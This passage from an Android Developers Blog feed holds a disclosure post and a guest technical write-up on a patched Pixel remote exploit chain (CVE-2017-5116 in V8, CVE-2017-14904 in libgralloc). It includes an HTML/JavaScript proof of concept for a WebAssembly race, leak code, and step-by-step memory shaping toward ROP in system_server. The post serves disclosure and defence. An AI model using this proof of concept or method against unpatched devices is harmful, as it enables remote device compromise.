Many of you have noticed a steady release of enhancements to Android Wear over the last few months since the launch of Wear 2.0. We are developing many more for the months ahead and look forward to sharing more when the features are ready.
&lt;br /&gt;



&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;/div&gt;
&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=mGlq7Vf0zWo:Vr3I5eDr6iM:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=mGlq7Vf0zWo:Vr3I5eDr6iM:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=mGlq7Vf0zWo:Vr3I5eDr6iM:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/mGlq7Vf0zWo" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/1172146862630091759"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/1172146862630091759"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/mGlq7Vf0zWo/android-wear-sdk-and-emulator-update.html" title="Android Wear SDK and Emulator Update"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://3.bp.blogspot.com/-BU3DM2c1S4g/WmjOyyLpfDI/AAAAAAAAFAE/rEA9DqvDy3cOPb4sf-DTXpBKvvuibKV1ACLcBGAs/s72-c/image1.png" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/01/android-wear-sdk-and-emulator-update.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-3333468996801480348</id>
    <published>2018-01-17T14:05:00.000-08:00</published>
    <updated>2018-01-18T09:43:19.313-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="phone"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Pixel"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="pwn"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Security"/>
    <title type="text">Android Security Ecosystem Investments Pay Dividends for Pixel</title>
    <content type="html">&lt;meta name="twitter:card" content="summary_large_image"&gt;
&lt;meta name="twitter:site" content="@AndroidDevelopersBlog"&gt;
&lt;meta name="twitter:creator" content="@AndroidDevelopers"&gt;
&lt;meta name="twitter:title" content="Android Security Ecosystem Investments Pay Dividends for Pixel"&gt;
&lt;meta name="twitter:description" content="In June 2017, the Android security team increased the top payouts for the Android Security Rewards (ASR) program and worked with researchers to streamline the exploit submission process."&gt;
&lt;meta name="twitter:image" content="https://1.bp.blogspot.com/-imY6jsk19ug/Wl_Jk2vg_LI/AAAAAAAAE_0/9H7EItVzfSU_kXkMqU_0pg4zK94LmpCWwCLcBGAs/s1600/Screen%2BShot%2B2018-01-17%2Bat%2B2.07.35%2BPM.png"&gt;


&lt;em&gt;Posted by Mayank Jain and Scott Roberts of the Android Security team&lt;/em&gt;

&lt;p&gt;
In June 2017, the Android security team &lt;a href="https://android-developers.googleblog.com/2017/06/2017-android-security-rewards.html"&gt;increased the top payouts&lt;/a&gt; for the &lt;a href="https://www.google.com/about/appsecurity/android-rewards/"&gt;Android Security Rewards&lt;/a&gt; (ASR) program and worked with researchers to streamline the exploit submission process. In August 2017, Guang Gong (&lt;a href="https://twitter.com/oldfresher"&gt;@oldfresher&lt;/a&gt;) of Alpha Team, Qihoo 360 Technology Co. Ltd. submitted the first working remote exploit chain since the ASR program's expansion. For his detailed report, Gong was awarded $105,000, which is the highest reward in the history of the ASR program and $7500 by &lt;a href="https://www.google.com/about/appsecurity/chrome-rewards/"&gt;Chrome Rewards program&lt;/a&gt; for a total of $112,500. The complete set of issues was resolved as part of the &lt;a href="https://source.android.com/security/bulletin/2017-12-01"&gt;December 2017 monthly security update.&lt;/a&gt; Devices with the security patch level of 2017-12-05 or later are protected from these issues. 
&lt;/p&gt;
&lt;p&gt;
All Pixel devices or partner devices using &lt;a href="https://source.android.com/devices/tech/ota/ab/"&gt;A/B (seamless) system updates&lt;/a&gt; will automatically install these updates; users must restart their devices to complete the installation.
&lt;/p&gt;
&lt;p&gt;
The Android Security team would like to thank Guang Gong and the &lt;a href="https://source.android.com/security/overview/acknowledgements"&gt;researcher community&lt;/a&gt; for their contributions to Android security. If you'd like to participate in Android Security Rewards program, check out our &lt;a href="https://www.google.com/about/appsecurity/android-rewards/"&gt;Program rules&lt;/a&gt;. For tips on how to submit reports, see &lt;a href="https://sites.google.com/site/bughunteruniversity/improve/how-to-submit-an-android-platform-bug-report"&gt;Bug Hunter University&lt;/a&gt;.
&lt;/p&gt;
&lt;p&gt;
&lt;em&gt;The following article is a guest blog post authored by Guang Gong of Alpha team, Qihoo 360 Technology Ltd.&lt;/em&gt;
&lt;/p&gt;
&lt;h1&gt;&lt;strong&gt;Technical details of a Pixel remote exploit chain&lt;/strong&gt;&lt;/h1&gt;


&lt;p&gt;
The Pixel phone is protected by many layers of security. It was the only device that was not pwned in the &lt;a href="https://www.thezdi.com/blog/2017/8/24/mobile-pwn2own-2017-returns-to-tokyo"&gt;2017 Mobile Pwn2Own&lt;/a&gt; competition. But in August 2017, my team discovered a remote exploit chain—the first of its kind since the ASR program expansion. Thanks to the Android security team for their responsiveness and help during the submission process.
&lt;/p&gt;
&lt;p&gt;
This blog post covers the technical details of the exploit chain. The exploit chain includes two bugs, CVE-2017-5116 and CVE-2017-14904. &lt;a href="https://chromereleases.googleblog.com/2017/09/stable-channel-update-for-desktop.html"&gt;CVE-2017-5116&lt;/a&gt; is a V8 engine bug that is used to get remote code execution in sandboxed Chrome render process.  CVE-2017-14904 is a bug in Android's libgralloc module that is used to escape from Chrome's sandbox. Together, this exploit chain can be used to inject arbitrary code into system_server by accessing a malicious URL in Chrome. To reproduce the exploit, an example vulnerable environment is Chrome 60.3112.107 + Android 7.1.2  (Security patch level 2017-8-05) (google/sailfish/sailfish:7.1.2/NJH47F/4146041:user/release-keys). 
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;The RCE bug (CVE-2017-5116)&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
New features usually bring new bugs. &lt;a href="https://v8project.blogspot.com/2017/06/v8-release-60.html"&gt;V8 6.0&lt;/a&gt; introduces support for &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer"&gt;SharedArrayBuffer&lt;/a&gt;, a low-level mechanism to share memory between JavaScript workers and synchronize control flow across workers. SharedArrayBuffers give JavaScript access to shared memory, atomics, and futexes. &lt;a href="https://developer.mozilla.org/en-US/docs/WebAssembly"&gt;WebAssembly&lt;/a&gt; is a new type of code that can be run in modern web browsers— it is a low-level assembly-like language with a compact binary format that runs with near-native performance and provides languages, such as C/C++, with a compilation target so that they can run on the web. By combining the three features, SharedArrayBuffer WebAssembly, and web worker in Chrome, an OOB access can be triggered through a race condition. Simply speaking, WebAssembly code can be put into a SharedArrayBuffer and then transferred to a web worker. When the main thread parses the WebAssembly code, the worker thread can modify the code at the same time, which causes an OOB access. 
&lt;/p&gt;
&lt;p&gt;
The buggy code is in the function &lt;a href="https://chromium.googlesource.com/v8/v8.git/+/07259a9ceafa078c9bb7f9ee1bb6f2d67256cc80/src/wasm/wasm-js.cc#69"&gt;GetFirstArgumentAsBytes&lt;/a&gt; where the argument args may be an ArrayBuffer or TypedArray object. After SharedArrayBuffer is imported to JavaScript, a TypedArray may be backed by a SharedArraybuffer, so the content of the TypedArray may be modified by other worker threads at any time.
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
    const v8::FunctionCallbackInfo&amp;lt;v8::Value&gt;&amp; args, ErrorThrower* thrower) {
  ......
  } else if (source-&gt;IsTypedArray()) {    //---&gt;source should be checked if it's backed by a SharedArrayBuffer
    // A TypedArray was passed.
    Local&amp;lt;TypedArray&gt; array = Local&amp;lt;TypedArray&gt;::Cast(source);
    Local&amp;lt;ArrayBuffer&gt; buffer = array-&gt;Buffer();
    ArrayBuffer::Contents contents = buffer-&gt;GetContents();
    start =
        reinterpret_cast&amp;lt;const byte*&gt;(contents.Data()) + array-&gt;ByteOffset();
    length = array-&gt;ByteLength();
  } 
  ......
  return i::wasm::ModuleWireBytes(start, start + length);
}
&lt;/pre&gt;


&lt;p&gt;
A simple PoC is as follows:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;&amp;lt;html&gt;
&amp;lt;h1&gt;poc&amp;lt;/h1&gt;
&amp;lt;script id="worker1"&gt;
worker:{
       self.onmessage = function(arg) {
        console.log("worker started");
        var ta = new Uint8Array(arg.data);
        var i =0;
        while(1){
            if(i==0){
                i=1;
                ta[51]=0;   //---&gt;4)modify the webassembly code at the same time
            }else{
                i=0;
                ta[51]=128;
            }
        }
    }
}
&amp;lt;/script&gt;
&amp;lt;script&gt;
function getSharedTypedArray(){
    var wasmarr = [
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
        0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,
        0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,
        0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,
        0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,
        0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];
    var sb = new SharedArrayBuffer(wasmarr.length);           //---&gt; 1)put WebAssembly code in a SharedArrayBuffer
    var sta = new Uint8Array(sb);
    for(var i=0;i&amp;lt;sta.length;i++)
        sta[i]=wasmarr[i];
    return sta;    
}
var blob = new Blob([
        document.querySelector('#worker1').textContent
        ], { type: "text/javascript" })

var worker = new Worker(window.URL.createObjectURL(blob));   //---&gt; 2)create a web worker
var sta = getSharedTypedArray();
worker.postMessage(sta.buffer);                              //---&gt;3)pass the WebAssembly code to the web worker
setTimeout(function(){
        while(1){
        try{
        sta[51]=0;
        var myModule = new WebAssembly.Module(sta);          //---&gt;4)parse the WebAssembly code
        var myInstance = new WebAssembly.Instance(myModule);
        //myInstance.exports.getAnswerPlus1();
        }catch(e){
        }
        }
    },1000);

//worker.terminate(); 
&amp;lt;/script&gt;
&amp;lt;/html&gt;
&lt;/pre&gt;


&lt;p&gt;
The text format of the WebAssembly code is as follows:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;00002b func[0]:
00002d: 41 2a                      | i32.const 42
00002f: 0b                         | end
000030 func[1]:
000032: 10 00                      | call 0
000034: 41 01                      | i32.const 1
000036: 6a                         | i32.add
000037: 0b                         | end
&lt;/pre&gt;


&lt;p&gt;
First, the above binary format WebAssembly code is put into a SharedArrayBuffer, then a TypedArray Object is created, using the SharedArrayBuffer as buffer. After that, a worker thread is created and the SharedArrayBuffer is passed to the newly created worker thread. While the main thread is parsing the WebAssembly Code, the worker thread modifies the SharedArrayBuffer at the same time. Under this circumstance, a race condition causes a &lt;a href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use"&gt;TOCTOU&lt;/a&gt; issue. After the main thread's bound check, the instruction " call 0" can be modified by the worker thread to "call 128" and then be parsed and compiled by the main thread, so an OOB access occurs.
&lt;/p&gt;
&lt;p&gt;
 
&lt;/p&gt;
&lt;p&gt;
Because the "call 0" Web Assembly instruction can be modified  to call any other Web Assembly functions, the exploitation of this bug is straightforward. If "call 0" is modified to "call $leak", registers and stack contents are dumped to Web Assembly memory. Because function 0 and function $leak have a different number of arguments, this results in many useful pieces of data in the stack being leaked.
&lt;/p&gt;



&lt;pre class="prettyprint"&gt; (func $leak(param i32 i32 i32 i32 i32 i32)(result i32)
    i32.const 0
    get_local 0
    i32.store
    i32.const 4
    get_local 1
    i32.store
    i32.const 8
    get_local 2
    i32.store
    i32.const 12
    get_local 3
    i32.store
    i32.const 16
    get_local 4
    i32.store
    i32.const 20
    get_local 5
    i32.store
    i32.const 0
  ))
&lt;/pre&gt;


&lt;p&gt;
Not only the instruction "call 0" can be modified, any "call funcx" instruction can be modified. Assume funcx is a wasm function with 6 arguments as follows, when v8 compiles funcx in ia32 architecture, the first 5 arguments are passed through the registers and the sixth argument is passed through stack. All the arguments can be set to any value by JavaScript:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;/*Text format of funcx*/
 (func $simple6 (param i32 i32 i32 i32 i32 i32 ) (result i32)
    get_local 5
    get_local 4
    i32.add)

/*Disassembly code of funcx*/
--- Code ---
kind = WASM_FUNCTION
name = wasm#1
compiler = turbofan
Instructions (size = 20)
0x58f87600     0  8b442404       mov eax,[esp+0x4]
0x58f87604     4  03c6           add eax,esi
0x58f87606     6  c20400         ret 0x4
0x58f87609     9  0f1f00         nop

Safepoints (size = 8)

RelocInfo (size = 0)

--- End code ---
&lt;/pre&gt;


&lt;p&gt;
When a JavaScript function calls a WebAssembly function, v8 compiler creates a JS_TO_WASM function internally, after compilation, the JavaScript function will call the created JS_TO_WASM function and then the created JS_TO_WASM function will call the WebAssembly function. JS_TO_WASM functions use different call convention, its first arguments is passed through stack. If "call funcx" is modified to call the following JS_TO_WASM function.
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;/*Disassembly code of JS_TO_WASM function */
--- Code ---
kind = JS_TO_WASM_FUNCTION
name = js-to-wasm#0
compiler = turbofan
Instructions (size = 170)
0x4be08f20     0  55             push ebp
0x4be08f21     1  89e5           mov ebp,esp
0x4be08f23     3  56             push esi
0x4be08f24     4  57             push edi
0x4be08f25     5  83ec08         sub esp,0x8
0x4be08f28     8  8b4508         mov eax,[ebp+0x8]
0x4be08f2b     b  e8702e2bde     call 0x2a0bbda0  (ToNumber)    ;; code: BUILTIN
0x4be08f30    10  a801           test al,0x1
0x4be08f32    12  0f852a000000   jnz 0x4be08f62  &amp;lt;+0x42&gt;
&lt;/pre&gt;


&lt;p&gt;
The JS_TO_WASM function will take the sixth arguments of funcx as its first argument, but it takes its first argument as an object pointer, so type confusion will be triggered when the argument is passed to the ToNumber function, which means we can pass any values as an object pointer to the ToNumber function. So we can fake an ArrayBuffer object in some address such as in a double array and pass the address to ToNumber.  The layout of an ArrayBuffer is as follows:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;/* ArrayBuffer layouts 40 Bytes*/                                                                                                                         
Map                                                                                                                                                       
Properties                                                                                                                                                
Elements                                                                                                                                                  
ByteLength                                                                                                                                                
BackingStore                                                                                                                                              
AllocationBase                                                                                                                                            
AllocationLength                                                                                                                                          
Fields                                                                                                                                                    
internal                                                                                                                                                  
internal                                                                                                                                                                                                                                                                                                      


/* Map layouts 44 Bytes*/                                                                                                                                   
static kMapOffset = 0,                                                                                                                                    
static kInstanceSizesOffset = 4,                                                                                                                          
static kInstanceAttributesOffset = 8,                                                                                                                     
static kBitField3Offset = 12,                                                                                                                             
static kPrototypeOffset = 16,                                                                                                                             
static kConstructorOrBackPointerOffset = 20,                                                                                                              
static kTransitionsOrPrototypeInfoOffset = 24,                                                                                                            
static kDescriptorsOffset = 28,                                                                                                                           
static kLayoutDescriptorOffset = 1,                                                                                                                       
static kCodeCacheOffset = 32,                                                                                                                             
static kDependentCodeOffset = 36,                                                                                                                         
static kWeakCellCacheOffset = 40,                                                                                                                         
static kPointerFieldsBeginOffset = 16,                                                                                                                    
static kPointerFieldsEndOffset = 44,                                                                                                                      
static kInstanceSizeOffset = 4,                                                                                                                           
static kInObjectPropertiesOrConstructorFunctionIndexOffset = 5,                                                                                           
static kUnusedOffset = 6,                                                                                                                                 
static kVisitorIdOffset = 7,                                                                                                                              
static kInstanceTypeOffset = 8,     //one byte                                                                                                            
static kBitFieldOffset = 9,                                                                                                                               
static kInstanceTypeAndBitFieldOffset = 8,                                                                                                                
static kBitField2Offset = 10,                                                                                                                             
static kUnusedPropertyFieldsOffset = 11
&lt;/pre&gt;


&lt;p&gt;
Because the content of the stack can be leaked, we can get many useful data to fake the ArrayBuffer. For example, we can leak the start address of an object, and calculate the start address of its elements, which is a FixedArray object. We can use this FixedArray object as the faked ArrayBuffer's properties and elements fields. We have to fake the map of the ArrayBuffer too, luckily, most of the fields of the map are not used when the bug is triggered. But the InstanceType in offset 8 has to be set to 0xc3(this value depends on the version of v8) to indicate this object is an ArrayBuffer.  In order to get a reference of the faked ArrayBuffer in JavaScript, we have to set the Prototype field of Map in offset 16 to an object whose Symbol.toPrimitive property is a JavaScript call back function. When the faked array buffer is passed to the ToNumber function, to convert the ArrayBuffer object to a Number, the call back function will be called, so we can get a reference of the faked ArrayBuffer in the call back function. Because the ArrayBuffer is faked in a double array, the content of the array can be set to any value, so we can change the field BackingStore and ByteLength of the faked array buffer to get arbitrary memory read and write. With arbitrary memory read/write, executing shellcode is simple. As JIT Code in Chrome is readable, writable and executable, we can overwrite it to execute shellcode.
&lt;/p&gt;
&lt;p&gt;
Chrome team fixed this bug very quickly in chrome 61.0.3163.79, just a week after I submitted the exploit. 
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;The EoP Bug (CVE-2017-14904)&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
The sandbox escape bug is caused by map and unmap mismatch, which causes a Use-After-Unmap issue. The buggy code is in the functions &lt;a href="https://android.googlesource.com/platform/hardware/qcom/display/+/android-7.1.2_r33/msm8996/libgralloc/mapper.cpp#79"&gt;gralloc_map&lt;/a&gt; and &lt;a href="https://android.googlesource.com/platform/hardware/qcom/display/+/android-7.1.2_r33/msm8996/libgralloc/ionalloc.cpp#166"&gt;gralloc_unmap&lt;/a&gt;:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;static int gralloc_map(gralloc_module_t const* module,
                       buffer_handle_t handle)
{ ……
    private_handle_t* hnd = (private_handle_t*)handle;
    ……
    if (!(hnd-&gt;flags &amp; private_handle_t::PRIV_FLAGS_FRAMEBUFFER) &amp;&amp;
        !(hnd-&gt;flags &amp; private_handle_t::PRIV_FLAGS_SECURE_BUFFER)) {
        size = hnd-&gt;size;
        err = memalloc-&gt;map_buffer(&amp;mappedAddress, size,
                                       hnd-&gt;offset, hnd-&gt;fd);        //---&gt; mapped an ashmem and get the mapped address. the ashmem fd and offset can be controlled by Chrome render process.
        if(err || mappedAddress == MAP_FAILED) {
            ALOGE("Could not mmap handle %p, fd=%d (%s)",
                  handle, hnd-&gt;fd, strerror(errno));
            return -errno;
        }
        hnd-&gt;base = uint64_t(mappedAddress) + hnd-&gt;offset;          //---&gt; save mappedAddress+offset to hnd-&gt;base
    } else {
        err = -EACCES;
}
……
    return err;
}
&lt;/pre&gt;


&lt;p&gt;
gralloc_map maps a graphic buffer controlled by the arguments handle to memory space and gralloc_unmap unmaps it. While mapping, the mappedAddress plus hnd-&gt;offset is stored to hnd-&gt;base, but while unmapping, hnd-&gt;base is passed to system call unmap directly minus the offset. hnd-&gt;offset can be manipulated from a Chrome's sandboxed process, so it's possible to unmap any pages in system_server from Chrome's sandboxed render process.
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;static int gralloc_unmap(gralloc_module_t const* module,
                         buffer_handle_t handle)
{
  ……
    if(hnd-&gt;base) {
        err = memalloc-&gt;unmap_buffer((void*)hnd-&gt;base, hnd-&gt;size, hnd-&gt;offset);    //---&gt; while unmapping, hnd-&gt;offset is not used, hnd-&gt;base is used as the base address, map and unmap are mismatched.
        if (err) {
            ALOGE("Could not unmap memory at address %p, %s", (void*) hnd-&gt;base,
                    strerror(errno));
            return -errno;
        }
        hnd-&gt;base = 0;
}
……
    return 0;
}

int IonAlloc::unmap_buffer(void *base, unsigned int size,
        unsigned int /*offset*/)                              
//---&gt; look, offset is not used by unmap_buffer
{
    int err = 0;
    if(munmap(base, size)) {
        err = -errno;
        ALOGE("ion: Failed to unmap memory at %p : %s",
              base, strerror(errno));
    }
    return err;
}
&lt;/pre&gt;


&lt;p&gt;
Although SeLinux restricts the domain isolated_app to access most of Android system service, isolated_app can still access three Android system services.
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;52neverallow isolated_app {
53    service_manager_type
54    -activity_service
55    -display_service
56    -webviewupdate_service
57}:service_manager find;
&lt;/pre&gt;


&lt;p&gt;
To trigger the aforementioned Use-After-Unmap bug from Chrome's sandbox, first put a GraphicBuffer object, which is parseable into a bundle, and then call the binder method convertToTranslucent of IActivityManager to pass the malicious bundle to system_server. When system_server handles this malicious bundle, the bug is triggered. 
&lt;/p&gt;
&lt;p&gt;
This EoP bug targets the same attack surface as the bug in our 2016 MoSec presentation, &lt;em&gt;&lt;a href="https://github.com/secmob/mosec2016/blob/master/A%20Way%20of%20Breaking%20Chrome%E2%80%99s%20Sandbox%20in%20Android.pdf"&gt;A Way of Breaking Chrome's Sandbox in Android&lt;/a&gt;&lt;/em&gt;. It is also similar to &lt;a href="https://googleprojectzero.blogspot.com/2016/12/bitunmap-attacking-android-ashmem.html"&gt;Bitunmap&lt;/a&gt;, except  exploiting it from a sandboxed Chrome render process is more difficult than from an app. 
&lt;/p&gt;
&lt;p&gt;
To exploit this EoP bug:
&lt;/p&gt;
&lt;p&gt;
1. Address space shaping. Make the address space layout look as follows, a heap chunk is right above some continuous ashmem mapping:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;7f54600000-7f54800000 rw-p 00000000 00:00 0           [anon:libc_malloc]
7f58000000-7f54a00000 rw-s 001fe000 00:04 32783         /dev/ashmem/360alpha29 (deleted)
7f54a00000-7f54c00000 rw-s 00000000 00:04 32781         /dev/ashmem/360alpha28 (deleted)
7f54c00000-7f54e00000 rw-s 00000000 00:04 32779         /dev/ashmem/360alpha27 (deleted)
7f54e00000-7f55000000 rw-s 00000000 00:04 32777         /dev/ashmem/360alpha26 (deleted)
7f55000000-7f55200000 rw-s 00000000 00:04 32775         /dev/ashmem/360alpha25 (deleted)
......
&lt;/pre&gt;


&lt;p&gt;
2. Unmap part of the heap (1 KB) and part of an ashmem memory (2MB–1KB) by triggering the bug: 
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;7f54400000-7f54600000 rw-s 00000000 00:04 31603         /dev/ashmem/360alpha1000 (deleted)
7f54600000-7f547ff000 rw-p 00000000 00:00 0           [anon:libc_malloc]
//---&gt;There is a 2MB memory gap
7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783        /dev/ashmem/360alpha29 (deleted)
7f54a00000-7f54c00000 rw-s 00000000 00:04 32781        /dev/ashmem/360alpha28 (deleted)
7f54c00000-7f54e00000 rw-s 00000000 00:04 32779        /dev/ashmem/360alpha27 (deleted)
7f54e00000-7f55000000 rw-s 00000000 00:04 32777        /dev/ashmem/360alpha26 (deleted)
7f55000000-7f55200000 rw-s 00000000 00:04 32775        /dev/ashmem/360alpha25 (deleted)
&lt;/pre&gt;


&lt;p&gt;
3. Fill the unmapped space with an ashmem memory:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;7f54400000-7f54600000 rw-s 00000000 00:04 31603      /dev/ashmem/360alpha1000 (deleted)
7f54600000-7f547ff000 rw-p 00000000 00:00 0         [anon:libc_malloc]
7f547ff000-7f549ff000 rw-s 00000000 00:04 31605       /dev/ashmem/360alpha1001 (deleted)  
//---&gt;The gap is filled with the ashmem memory 360alpha1001
7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783      /dev/ashmem/360alpha29 (deleted)
7f54a00000-7f54c00000 rw-s 00000000 00:04 32781      /dev/ashmem/360alpha28 (deleted)
7f54c00000-7f54e00000 rw-s 00000000 00:04 32779      /dev/ashmem/360alpha27 (deleted)
7f54e00000-7f55000000 rw-s 00000000 00:04 32777      /dev/ashmem/360alpha26 (deleted)
7f55000000-7f55200000 rw-s 00000000 00:04 32775      /dev/ashmem/360alpha25 (deleted)
&lt;/pre&gt;


&lt;p&gt;
4. Spray the heap and the heap data will be written to the ashmem memory:
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;7f54400000-7f54600000 rw-s 00000000 00:04 31603        /dev/ashmem/360alpha1000 (deleted)
7f54600000-7f547ff000 rw-p 00000000 00:00 0           [anon:libc_malloc]
7f547ff000-7f549ff000 rw-s 00000000 00:04 31605          /dev/ashmem/360alpha1001 (deleted)
//---&gt;the heap manager believes the memory range from 0x7f547ff000 to 0x7f54800000 is still mongered by it and will allocate memory from this range, result in heap data is written to ashmem memory
7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783        /dev/ashmem/360alpha29 (deleted)
7f54a00000-7f54c00000 rw-s 00000000 00:04 32781        /dev/ashmem/360alpha28 (deleted)
7f54c00000-7f54e00000 rw-s 00000000 00:04 32779        /dev/ashmem/360alpha27 (deleted)
7f54e00000-7f55000000 rw-s 00000000 00:04 32777        /dev/ashmem/360alpha26 (deleted)
7f55000000-7f55200000 rw-s 00000000 00:04 32775        /dev/ashmem/360alpha25 (deleted)
&lt;/pre&gt;


&lt;p&gt;
5. Because the filled ashmem in step 3 is mapped both by system_server and render process, part of the heap of system_server can be read and written by render process and we can trigger system_server to allocate some &lt;a href="https://android.googlesource.com/platform/frameworks/native/+/android-7.1.1_r58/include/ui/GraphicBuffer.h#41"&gt;GraphicBuffer&lt;/a&gt; object in ashmem. As GraphicBuffer is inherited from ANativeWindowBuffer, which has a member named common whose type is android_native_base_t, we can read two function points (incRef and decRef) from ashmem memory and then can calculate the base address of the module libui. In the latest Pixel device, Chrome's render process is still 32-bit process but system_server is 64-bit process. So we have to leak some module's base address for ROP. Now that we have the base address of libui, the last step is  to trigger ROP. Unluckily, it seems that the points incRef and decRef haven't been used. It's impossible to modify it to jump to ROP, but we can modify the virtual table of GraphicBuffer to trigger ROP.
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;typedef struct android_native_base_t
{
    /* a magic value defined by the actual EGL native type */
    int magic;

    /* the sizeof() of the actual EGL native type */
    int version;

    void* reserved[4];

    /* reference-counting interface */
    void (*incRef)(struct android_native_base_t* base);
    void (*decRef)(struct android_native_base_t* base);
} android_native_base_t;
&lt;/pre&gt;


&lt;p&gt;
6.Trigger a GC to execute ROP
&lt;/p&gt;
&lt;p&gt;
When a GraphicBuffer object is deconstructed, the virtual function onLastStrongRef is called, so we can replace this virtual function to jump to ROP. When GC happens, the control flow goes to ROP. Finding an ROP chain in limited module(libui) is challenging, but after hard work, we successfully found one and dumped the contents of the file into /data/misc/wifi/wpa_supplicant.conf .
&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h3&gt;


&lt;p&gt;
The Android security team responded quickly to our report and included the fix for these two bugs in the &lt;a href="https://source.android.com/security/bulletin/2017-12-01"&gt;December 2017 Security Update&lt;/a&gt;. Supported Google device and devices with the security patch level of 2017-12-05 or later address these issues. While parsing untrusted parcels still happens in sensitive locations, the Android security team is working on hardening the platform to mitigate against similar vulnerabilities.  
&lt;/p&gt;
&lt;p&gt;
The EoP bug was discovered thanks to a joint effort between 360 Alpha Team and 360 C0RE Team. Thanks very much for their effort.
&lt;/p&gt;

&lt;style&gt;

.com {
color: #32CD32;
font-weight: bold;
}

&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=am2fuJ6e_FE:mNhQdyvyJQk:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=am2fuJ6e_FE:mNhQdyvyJQk:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=am2fuJ6e_FE:mNhQdyvyJQk:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/am2fuJ6e_FE" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/3333468996801480348"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/3333468996801480348"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/am2fuJ6e_FE/android-security-ecosystem-investments.html" title="Android Security Ecosystem Investments Pay Dividends for Pixel"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/01/android-security-ecosystem-investments.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-6612720546587004175</id>
    <published>2018-01-15T02:30:00.000-08:00</published>
    <updated>2018-01-16T08:50:56.080-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
